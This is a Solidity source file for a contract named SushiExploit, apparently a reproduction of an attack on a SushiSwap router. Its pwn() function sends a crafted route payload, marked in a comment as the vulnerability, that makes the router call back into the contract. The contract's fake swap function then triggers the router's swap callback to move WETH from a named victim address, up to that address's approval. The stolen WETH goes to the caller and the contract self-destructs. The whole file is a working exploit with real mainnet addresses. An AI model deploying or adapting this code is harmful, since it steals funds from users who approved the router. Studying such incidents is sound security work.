// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.9;
import "./WETH.sol";

interface SushiRouter {
    function processRoute(
        address tokenIn,
        uint256 amountIn,
        address tokenOut,
        uint256 amountOutMin,
        address to,
        bytes memory route
    ) external returns (uint256 amountOut);

    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata data
    ) external;
}

contract SushiExploit {
    
    address constant NATIVE_ADDRESS =
        0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    address router = 0x044b75f554b886A065b9567891e45c79542d7357;
    address sifu = 0x31d3243CfB54B34Fc9C73e1CB1137124bD6B13E1;
    address wethaddress = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    SushiRouter sushiRouter = SushiRouter(router);
    WETH9 weth = WETH9(wethaddress);

    // vm.label( address(router),"SushiRouter");
    // vm.label( address(sifu),"OxSifu.eth");
    // vm.label( address(wETH), "WETH");

    function pwn() external {
        bytes memory payLoad = abi.encodePacked(
            uint8(4),
            address(this),
            uint8(1),
            address(this),
            true,
            address(this)
        );
        sushiRouter.processRoute(
            NATIVE_ADDRESS,
            0,
            NATIVE_ADDRESS,
            0,
            address(0x00),
            payLoad //Vulnerability
        );
        weth.transfer(msg.sender, weth.balanceOf(address(this)));
        selfdestruct(payable(msg.sender));
    }

    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1) {
        //==
        uint256 balance = weth.balanceOf(address(sifu));
        uint256 allowed = weth.allowance(address(sifu), address(router));
        uint amount = balance > allowed ? allowed : balance;
        //
        bytes memory data2 = abi.encode(address(weth), sifu);
        sushiRouter.uniswapV3SwapCallback(int256(amount), 0, data2);
    }
}
